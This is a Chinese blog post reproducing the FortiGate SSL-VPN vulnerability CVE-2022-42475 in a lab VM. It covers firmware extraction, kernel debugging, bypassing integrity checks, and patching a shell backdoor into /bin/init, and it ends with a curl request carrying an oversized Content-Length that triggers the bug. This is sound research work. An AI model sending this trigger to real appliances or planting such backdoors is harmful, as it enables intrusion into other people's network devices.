---
title: CVE-2022-42475 foritgate SSLvpn漏洞 复现
date: 2023-04-04 19:54:59 +0800
categories: [CVE]
tags: [pwn, cve, poc]
permalink: /posts/id=58/
pin: false
published:
---

## 固件下载

fortigate固件镜像下载站：https://support.fortinet.com/Download/FirmwareImages.aspx
下载镜像需要拥有一个fortinet旗下的正在运行的产品。下载一个防火墙的虚拟机镜像运行，初始账号admin，密码为空

```shell
# 查看映射IP
get system interface physcial
```

浏览器访问IP，按流程绑定fortinet账户，然后就能下载固件了

## 固件提取

### 提取fortigate_VMX的文件系统

1.VMware加载fortigate镜像，进行初始化

2.然后将vmdk硬盘(注意:是本地虚拟机生成的硬盘)添加硬盘到ubuntu虚拟机上，即可访问内容

### 提取fortigate_KVM 的文件系统

```shell
sudo guestfish --rw -a ./fortios.qcow2
run 
mount /dev/sda1 /
copy-out /rootfs.gz /home/ef4tless/Desktop/7.0.0ALI/
copy-out /flatkc /home/ef4tless/Desktop/7.0.0ALI/
vmlinux-to-elf flatkc flatkc_elf
```

得到rootfs后其余步骤和VMX相同

+ 解压rootfs

```shell
#!/bin/bash
gzip -d rootfs.gz
mkdir fs
cd fs
sudo cpio -idmv < ../rootfs # 解压rootfs
```

+ 解压bin

```shell
sudo chroot . /sbin/xz --check=sha256 -d /bin.tar.xz
sudo chroot . /sbin/ftar -xf /bin.tar
```

## 固件调试及初始化

为了能用gdb调试防火墙虚拟机，先安装virt-machine，新建KVM虚拟机，可参照[官方文档](https://support.fortinet.com.cn/uploadfile/2016/0512/20160512023859365.pdf)

编辑KVM虚拟机设置

```shell
export EDITOR=gedit
virsh edit Fortigate-7.2.1 # 虚拟机名

<domain type='kvm'>

change to

<domain type='qemu' xmlns:qemu='http://libvirt.org/schemas/domain/qemu/1.0'>
    <qemu:commandline>
        <qemu:arg value='-s'/>
    </qemu:commandline>
```

再次启动，即可用gdb进行内核级调试

```shell
target remote :1234 
hbreak * 0xffffffff807d1cd4 
c 
```

## 漏洞复现&分析

在复现开始之前，明确一下fortigate防火墙启动流程：

1、由内核文件flatkc解压 rootfs.gz，调用 fgt_verify 校验文件系统各信息，判断后执行/sbin/init

2、/sbin/init 解压文件系统，调用执行 /bin/init 

3、/bin/init 会进行多次的系统校验，校验失败则重启系统

### 搭建调试环境

首先是fortigate漏洞环境的配置，启动Fortigate_VM，进入web界面

这里需要绑定许可证，关于许可证的生成可以参考：https://wzt.ac.cn/2023/03/02/fortios_padding/

重启后进入配置页面，配置SSL-vpn，配置如下图

<img src="https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230404150227162.png" alt="image-20230404150227162" style="zoom:50%;" />



<img src="https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230406110208062.png" alt="image-20230406110208062" style="zoom:50%;" />



<img src="https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230406110256478.png" alt="image-20230406110256478" style="zoom:50%;" />

<img src="https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230406110329044.png" alt="image-20230406110329044" style="zoom:50%;" />

<img src="https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230406110402040.png" alt="image-20230406110402040" style="zoom:50%;" />



在访问页面中，由于SSL1.0不被大部分浏览器所支持，需要添加一个配置文件

![image-20230406110454530](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230406110454530.png)

```shell
# ef4tless为用户名
export OPENSSL_CONF=/home/ef4tless/openssl_allow_tls1.0.cnf
```

openssl_allow_tls1.0.cnf

```shell
openssl_conf = openssl_init

[openssl_init]
ssl_conf = ssl_sect

[ssl_sect]
system_default = system_default_sect

[system_default_sect]
CipherString = DEFAULT@SECLEVEL=1
```

![image-20230417193727934](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230417193727934.png)

然后是调试环境的配置(需要先提取固件)

#### patch /bin/init 文件

为了获取完整的shell以便于调试，我们需要patch一个后门函数

在防火墙输入execute ping sh 报错 `Unable to resolve hostname.`

在ida中搜索字符串得到该命令所调用函数`sub_23DDB20`

![image-20230406150341909](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230406150341909.png)

修改为

![image-20230410141626503](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230410141626503.png)

这样在执行 execute ping sh 的时候相当于执行 system('sh')

#### 绕过文件系统检测

由于后续我们需要在fortigate中放入busybox等调试工具，而fortgate会对文件系统进行一些检测，为使fortigate正常启动，需要patch几个启动文件

首先是修改flatkc中的`fgt_verify`函数的返回值为0，绕过对文件系统hash的验证，内核调试下的gdb在验证函数位置下断点

![image-20230406173414286](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230406173414286.png)

```shell
b *0xFFFFFFFF807D0F1F
c
```

然后在执行验证后，将eax置零(return 返回值)patch为0，绕过内核引导程序

```shell
set $eax=0
```

在init中同样存在类似的检测，定位到其中的如下校验函数，进行静态patch

![](https://pic.imgdb.cn/item/6432f04a0d2dde5777ea96ed.jpg)

![](https://pic.imgdb.cn/item/6432f0580d2dde5777eaab09.jpg)

#### 放入gdbserver , busybox ,frpc等文件并打包镜像

busybox

1.下载：https://busybox.net/downloads/

2.预编译配置：

​	（1）make menuconfig

​	（2）修改配置信息

​				Build Options —> 选择[*] Build Busybox as a static binary（no shared libs）

​				去掉 Coreutils—>sync 选项

​	（3）make 

​				make install

​				编译完成后文件在./_install/bin/busybox

3.复制 busybox 到 rootfs 的/bin 目录下

```shell
cd fs
cp ../busybox-1.35.0/_install/bin/busybox ./bin/
chmod 777 ./bin/busybox
```

4.删除原来的sh软链接并创建busybox软链接

```shell
sudo rm -rf ./bin/sh
cd bin
ln -s /bin/busybox sh
```



frpc

```shell
# frps.ini
[common]
bind_port = 3000


# frpc.ini
[common]
server_addr = 192.168.122.1
server_port = 3000

[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 1235
remote_port = 1236
```
gdbserver

下载静态编译的gdbserver：https://github.com/hugsy/gdb-static

或者自己编译一份

下载gdb源码：https://www.gnu.org/software/gdb/download/

```shell
cd gdb/gdbserver
./configure
```

使用文本编辑器打开`gdbserver/Makefile`文件，并找到以下行：

```
LDFLAGS = ...
```

修改这一行，添加静态链接选项`-static`：

```
LDFLAGS = -static ...
```

```shell
# 在当前文件夹得到gdbserver
make gdbserver
```



将上述工具放入.bin/文件夹里，打包镜像

```shell
cd fs
sudo chroot . /sbin/ftar -cf bin.tar ./bin
sudo rm -rf bin.tar.xz
sudo chroot . /sbin/xz --check=sha256 -e bin.tar
sudo rm -rf bin/
mkdir ../make
find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../make/rootfs.gz


sudo guestfish --rw -a ./fortios.qcow2
run
mount /dev/sda1 /
copy-in /home/ef4tless/Desktop/7.0.0ALI/make/rootfs.gz /
```

### 漏洞利用

启动虚拟机，启动frp与主机实现连接

![image-20230406111825521](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230406111825521.png)

用ssh连接fortigate，运行 gdbserver attach sslvpnd

```shell
ssh admin@192.168.122.249
execute ping sh
busybox mkdir /usr/bin
busybox --install -s /usr/bin
gdbserver --attach 192.168.122.249:1235 `pidof sslvpnd`
```

![image-20230406111852039](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230406111852039.png)

发送 payload触发漏洞

```shell
curl --tlsv1.0 --tls-max 1.0 -v -k --ciphers DEFAULT@SECLEVEL=0 -H "ContentLength: 2147483647" --data 1 https://192.168.122.249:10443/remote/login
```

![image-20230406111949683](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230406111949683.png)



## tips

创建虚拟机报错

![image-20230417175113302](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230417175113302.png)

可能是guestfish占用了镜像资源，也有可能是镜像没有运行权限